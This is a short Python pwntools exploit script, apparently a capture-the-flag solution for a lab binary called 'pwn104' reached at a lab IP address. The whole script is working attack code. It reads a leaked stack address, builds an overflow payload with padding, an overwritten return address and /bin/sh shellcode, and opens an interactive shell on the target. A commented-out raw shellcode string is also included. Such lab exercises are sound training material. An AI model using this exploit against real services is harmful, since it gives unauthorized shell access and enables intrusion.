from pwn import *
pad = cyclic(cyclic_find(0x61616177))
nop_slide = b"\x90"*1000
#context.update(arch='i386', os='linux')
context.update(arch='amd64', os='linux')
#shellcode = "jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3jph\x01\x01\x01\x01\x814\x24ri\x01,1\xc9Qj\x07Y\x01\xe1Qj\x08Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"
shellcode =asm( shellcraft.sh())
#proc = process("./pwn104.pwn104")
if (len(sys.argv)<= 1):
   proc = remote("10.10.142.69",9004) 
    #proc = process(os.getcwd() + "/pwn104.pwn104")
elif (sys.argv[1] == "dbg"):
    proc = gdb.debug([os.getcwd() + "/pwn104.pwn104"],'''
    unset env LINES
    unset env COLUMNS
    break main
    continue
    ''')
k = proc.recvline()
print(k)
k = proc.recvline()
print(k)
k = proc.recvline()
print(k)
k = proc.recvline()
print(k)
k = proc.recvline()
print(k)
k = proc.recvline()
print(k)
k = proc.recvline()
print(k)
k = proc.recvline()
print(k)
k = proc.recvline()
print(k)
k = proc.recvline()
print(k)
print(k[-15:-1].decode("utf-8"))
#eip = p64(int(0xffffd510+200)
sbuf = k[-15:-1].decode("utf-8")
eip = p64(int(sbuf,base=16)+0x60)
payload = pad + eip + shellcode
print(hexdump(shellcode))
print(shellcraft.sh())
print(hexdump(payload))
proc.send(payload)
proc.interactive()
